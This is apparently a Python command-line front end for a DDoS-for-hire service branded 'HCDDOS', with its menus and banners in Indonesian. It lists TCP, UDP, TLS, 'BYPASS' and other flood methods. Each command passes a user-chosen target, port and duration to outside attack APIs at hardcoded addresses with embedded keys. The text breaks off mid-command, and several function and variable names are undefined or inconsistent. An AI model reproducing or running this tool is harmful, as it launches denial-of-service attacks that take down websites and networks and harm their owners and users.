# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

B = '\033[0;33m' #KUNING
P = '\033[0;94m' #BIRU
srv = '10'

def HC():
	os.system ("clear")
	print("""
 
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         

\033[37m[ HC ]
\033[0;33mUntuk Waktu sudah di sesuaiin sama Creater untuk menghindari Suspended Api Server agar server berjalan dengan sempurna kedepannya maka patuhi saja peraturannya!

     ☢️Server Online \033[0;94m10
          ☢️Concurent \033[0;94m3


\033[0;33mL4 [Network/Transport]


\033[37m🔥 TCP [URL] [PORT] [TIME / MAKS 90]

\033[37m🔥 OVH [URL] [PORT] [TIME / MAKS 90]

\033[37m🔥 UDP [URL] [PORT] [TIME / MAKS 90]

\033[37m🔥 STR [URL] [PORT] [TIME / MAKS 90]

\033[37m🔥 XCF [URL] [PORT] [TIME / MAKS 90]



\033[0;33mL7 [Web/Site]


\033[37m🔥 LOOP [URL] [PORT] [TIME / MAKS 120]

\033[37m🔥 SOCKET [URL] [PORT] [TIME / MAKS 120]

\033[37m🔥 HTTPS [URL] [PORT] [TIME / MAKS 120]

\033[37m🔥 TLS [URL] [PORT] [TIME / MAKS 120]

\033[37m🔥 TLS-UAM [PORT] [TIME / MAKS 120]

\033[37m🔥 SSL [URL] [PORT] [TIME / MAKS 120]

\033[37m🔥 FORCE [URL] [PORT] [TIME / MAKS 120]

\033[37m🔥 BYPASS [URL] [PORT] [TIME / MAKS 120]

\033[37m🔥 HCDDOS [URL] [PORT] [TIME / MAKS 300]


\033[0;33mSpecial method power C2 Api by Hanzclay
""")

def KILL():
	os.system ("clear")
	print("""
                     _   _                 _____ _             
                    | | | |               /  __ \ |            
                    | |_| | __ _ _ __  ___| /  \/ | __ _ _   _ 
                    |  _  |/ _` | '_ \|_  / |   | |/ _` | | | |
                    | | | | (_| | | | |/ /| \__/\ | (_| | |_| |
                    \_| |_/\__,_|_| |_/___|\____/_|\__,_|\__, |
                                                          __/ |
                                                          |___/ 

\033[32m                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠀⣠⠒⠀⠀⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠞⠋⠉⠀⠀⠀⠀ ⠀
                        ⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⣿⠂⠀⠀⠀⠀⣀⠄⡴⢈⣤⣎⠴⡏⠀⣀⠄⠀⠀⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⣿⠃⠀⠀⠀⡞⠀⣼⣽⣷⡿⡣⣾⣿⣶⣿⣶⡶⠖⠄⠂⠀⠀⠀ 
                        ⠀⠀⢠⠀⢸⣿⠀⠀⠀⢀⢹⣆⢀⣀⠀⣆⣾⣻⢞⡿⣺⣿⡿⠿⠛⠛⠻⢿⣿⣶⣄⠀⠀⠀ 
                        ⠀⠀⣯⠀⠘⣼⢢⣰⣇⣼⣾⣯⢹⢿⣶⣿⡿⣱⣿⡥⠃⣁⠤⣤⡤⡀⠀⠀⠈⣿⠏⠀⠀⠀ 
                        ⠀⠀⠸⣧⡀⣹⣬⢿⡟⢿⢿⠿⣿⢻⡅⣾⣾⣏⡎⡴⠊⣀⠀⢈⣿⣾⠂⠀⢰⠿⠀⠀⠀⠀ 
                        ⠀⠀⠀⠙⢿⣺⡜⢸⣿⣿⢘⡶⢵⣿⡿⣸⢿⣷⣞⣗⣺⣟⣿⠯⡶⠊⠀⣠⣣⠃⠀⠀⠀⠀ 
                        ⠀⠀⠀⠐⠦⢛⠿⣾⣿⣛⣾⣶⣿⢿⣿⡛⣯⣽⣻⣿⡟⢿⣳⠟⠁⢀⣞⡕⠁⠀⠀⠀⠀⠀ 
                        ⠀⠀⢠⠀⠀⡀⠳⣾⣿⣿⡿⣿⣷⣽⣯⣶⠾⢿⣿⣽⠼⠊⠀⢀⣴⡿⠽⠩⣇⣄⠀⠀⠀⠀ 
                        ⠀⠀⢠⣷⣸⣿⣇⡈⣿⣿⣿⣿⣿⣻⣞⣿⠟⠋⠉⠙⠀⢀⣴⢹⣿⣷⢿⣛⡏⠉⠀⠀⠀⠀ 
                        ⠀⠀⣾⣯⠛⠸⣞⣻⣯⢽⣴⣿⡟⣿⢹⡏⠀⢀⣤⠀⣴⣻⢿⣿⣿⡋⢤⠗⠀⠀⠀⠀⠀⠀ 
                        ⢀⡀⠘⣿⡷⠋⠀⠻⢼⣟⠟⠃⢹⣿⣿⠀⢸⡿⠃⣾⣿⣿⢸⢽⣿⠛⠉⠀⡀⣤⡤⠂⠀⠀ 
                        ⠸⣙⠤⡞⠀⠀⠀⡠⠔⠒⠂⢤⡘⠙⣻⠀⠘⣷⢰⢿⣟⣺⣟⣊⠉⢠⠤⣾⠞⡽⠧⢤⣀⡀ 
                        ⠀⡯⣦⠁⠀⠀⣾⠀⠀⠀⠀⠀⣈⣲⣾⠀⠀⠈⠺⡾⣍⣫⠙⡳⣷⣏⠞⠉⠁⠈⠑⡽⡆⠀ 
                        ⠀⠹⣦⡀⠀⠀⡿⣦⣄⣠⣴⠟⠉⠀⠈⡄⠀⠀⠀⠙⠮⣏⣙⠿⠓⠁⠀⠀⢀⣀⣀⣷⡇⠀ 
                        ⠀⠀⠙⣧⡀⠀⠘⠾⠾⠼⠋⠀⠀⠀⠀⣸⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠃⠀⠐⣱⠁⠀ 
                        ⠀⠀⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⣠⠞⢿⢿⡟⠢⠤⣀⣀⣀⣀⣤⣚⣶⠤⣤⡤⠚⠁⠀⠀ 
                        ⠀⠀⠀⠠⢔⣲⠿⠗⢲⣴⢶⣚⡩⠄⣱⡼⣮⡇⠀⠀⣀⠬⢻⢗⣟⣿⣵⠶⣳⠾⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠘⠢⠜⠋⢺⠏⠐⠪⠭⣙⣭⣟⡿⠷⣊⡱⢠⢾⡞⠚⠉⠛⠉⠁⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⣔⢓⣒⣉⠩⣭⣟⠋⣿⣏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣏⠋⡿⠚⠉⠉⠀ 
                                                       
\033[37m                        [STATUS] DDoS BERHASIL DI STOP!
\033[0;33m                            SERANGAN DDOS SELESAI!
\033[37m                        DAN TERMINAL BERHASIL DI REFRESH!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                USER     : \033[0;33m[ \033[032mHCDDOS \033[0;33m]
\033[0;94m                CREATOR  : \033[0;33m[ \033[032mHanzClay Fixxed \033[0;33m]
\033[0;94m                TELE     : \033[0;33m[ \033[32m@kucing_super \033[0;33m]
\033[0;94m                CHANNELS : \033[0;33m[ \033[32mhttps://t.me/aktivitascyberselatan \033[0;33m]
\033[0;94m                YOUTUBE  : \033[0;33m[ \033[32mhttps://youtube.com \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh Hanzclay HCDDOS \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
\033[1;36m
\033[37m                            ➲                   TYPE:
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                LS     : \033[0;33m[ \033[032mTO SEE ALL METHOD LIST \033[0;33m]
\033[0;94m                HC     : \033[0;33m[ \033[32mTO VIEW AND USE SPECIAL XCDDOS \033[0;33m]
╚════════════════════════════════════════════════════════╝
""")



def main():


	while True:
		sys.stdout.write(f"\x1b]2;[/] HCDDOS :: Server Online {srv} :: Running: {srv}/{srv}\x07")
		sin = input("\033[0;30;45mHCDDOS\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			XC()
		if sinput == "stop" or sinput == "STOP":
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			KILL()
		if sinput == "back" or sinput == "BACK":
			os.system ("clear")
			XC()
		if sinput == "hc" or sinput == "HC":
			XC()
		if sinput == "layer12" or sinput == "l12" or sinput == ".layer12" or sinput == "LAYER12" or sinput == ".LAYER12" or sinput == "L12":
			XC()
		if sinput == "vvip" or sinput == "vip" or sinput == ".vvip" or sinput == "VVIP" or sinput == ".VVIP" or sinput == "VIP":
			XC()
		if sinput == "layer7" or sinput == "l7" or sinput == ".layer7" or sinput == "LAYER7" or sinput == ".LAYER7" or sinput == "L7":
			XC()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == "LS" or sinput == ".ls" or sinput == "ls" or sinput == ".LS" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			XC()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()

#########L7 HC API########
		elif sinput == "socket" or sinput == "SOCKET":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				xin = requests.get(f'https://api.ngocphong.space/api?key=5682628749&host={url}&time={time}&port={port}&method=HTTPS-RATES').json()
				os.system ("clear")
				print(f"""
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
\033[0;33m ⚠️[INFO] {hanz}!⚠️
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[ \033[32m{url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[ \033[32m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m RANDOM \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mSOCKET\033[0;33m]
\033[0;94m                VVIP     : \033[0;33m[ \033[32mSPECIAL \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mHanzclay \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh Hanzclay HCDDOS \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")

			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "ssl" or sinput == "SSL":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				xin = requests.get(f'http://157.245.54.106:3000/api/attack?key=ngocphong&url={url}&port={port}&time={time}&method=CF').json()
				os.system ("clear")
				print(f"""  
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
\033[0;33m ⚠️[INFO] {hanz}!⚠️
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[ \033[32m{url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[ \033[32m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m RANDOM \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mSSL\033[0;33m]
\033[0;94m                VVIP     : \033[0;33m[ \033[32mSPECIAL \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mHanzclay \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh Hanzclay HCDDOS \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by Hanzclay
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bypass" or sinput == "BYPASS":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				hanz = requests.get(f'http://157.245.54.106:3000/api/attack?key=ngocphong&url={url}&port={port}&time={time}&method=BYPASS').json()
				os.system ("clear")
				print(f"""  
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
                                                         
\033[0;33m ⚠️[INFO] {hanz}!⚠️

╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[\033[32m {url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[\033[32m {time} \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m {port} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} server / 1 cons 👑 \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mBYPASS\033[0;33m]
\033[0;94m                STATUS   : \033[0;33m[ \033[32mSPECIAL VVIP👑 \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mHanzclay 👑 \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh Hanzclay HCDDOS 👑\033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by Hanzclay
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "hcddos" or sinput == "HCDDOS":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time= sin.split()[3]
				Hanz = requests.get(f'http://157.245.54.106:3000/api/attack?key=ngocphong&url={url}&port={port}&time={time}&method=FLOOD').json()
				#xin = requests.get(f'http://157.245.54.106:3000/api/attack?key=ngocphong&url={url}&port={port}&time={time}&method=HTTPS').json()
				os.system ("clear")
				print(f"""
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
                                   
\033[0;33m ⚠️[INFO] {xin}!⚠️

╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[\033[32m {url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[\033[32m {time} \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m {port} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 2 cons 👑 \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mXCDDOS\033[0;33m]
\033[0;94m                STATUS   : \033[0;33m[ \033[32mSPECIAL VVIP👑 \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mHanzclay 👑 \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh Hanzclay HCDDOS 👑\033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "loop" or sinput == "LOOP":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				Hanz = requests.get(f'https://api.ngocphong.space/api?key=5682628749&host={url}&time={time}&port={port}&method=HTTPS-TLS').json()
				os.system ("clear")
				print(f""" 
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
                                      
\033[0;33m ⚠️[INFO] {hanz}!⚠️

╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[\033[32m {url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[\033[32m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mLOOP\033[0;33m]
\033[0;94m                STATUS   : \033[0;33m[ \033[32mSPECIAL VVIP👑 \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mHanzclay 👑 \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh HanzClay HCDDOS 👑\033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "force" or sinput == "FORCE":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				Hanz = requests.get(f'https://api.ngocphong.space/api?key=5682628749&host={url}&time={time}&port={port}&method=HTTPS-TLS').json()
				os.system ("clear")
				print(f"""
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
                                                         
\033[0;33m ⚠️[INFO] {Hanz}!⚠️

╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[\033[32m {url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[\033[32m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mFORCE\033[0;33m]
\033[0;94m                STATUS   : \033[0;33m[ \033[32mSPECIAL VVIP👑 \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mHanzClay 👑 \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh HanzClay HCDDOS 👑\033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "https" or sinput == "HTTPS":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				Hanz = requests.get(f'http://157.245.54.106:3000/api/attack?key=ngocphong&url={url}&port={port}&time={time}&method=HTTPS').json()
				os.system ("clear")
				print(f"""
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
\033[0;33m ⚠️[INFO] {xin}!⚠️

╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[\033[32m {url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[\033[32m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mHTTPS\033[0;33m]
\033[0;94m                STATUS   : \033[0;33m[ \033[32mSPECIAL VVIP👑 \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mHanzClay 👑 \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh HanzClay HCDDOS 👑\033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls" or sinput == "TLS":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				Hanz = requests.get(f'https://api.ngocphong.space/api?key=5682628749&host={url}&time={time}&port={port}&method=HTTPS-TLS').json()
				os.system ("clear")
				print(f"""
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
                                                         
\033[0;33m ⚠️[INFO] {Hanz}!⚠️
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   TARGET   : \033[0;33m[ \033[0;94m{url} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[\033[0;94m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94mRANDOM \033[0;33m]
\033[0;94m                   LAYER-7  : \033[0;33m[ \033[0;94mTLS \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mHanzClay \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")

			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls-uam" or sinput == "TLS-UAM":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				Hanz = requests.get(f'https://api.ngocphong.space/api?key=5682628749&host={url}&time={time}&port={port}&method=HTTPS-TLS').json()
				os.system ("clear")
				print(f"""
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
                                                         
\033[0;33m ⚠️[INFO] {Hanz}!⚠️
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   TARGET   : \033[0;33m[ \033[0;94m{url} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94mRANDOM \033[0;33m]
\033[0;94m                   LAYER-7  : \033[0;33m[ \033[0;94mTLS-UAM \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mHanzClay \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")

#########L4 XC API########

			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tcp" or sinput == "TCP":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				Hanz = requests.get(f'http://157.245.54.106:3000/api/attack?key=ngocphong&url={url}&port={port}&time={time}&method=TCP').json()
				os.system ("clear")
				print(f"""
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
                                                         
\033[0;33m ⚠️[INFO] {Hanz}!⚠️
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   TARGET   : \033[0;33m[ \033[0;94m{url} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mTCP \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mHanzClay \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")

			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "ovh" or sinput == "OVH":
			try:
				url = sin.split()[1]
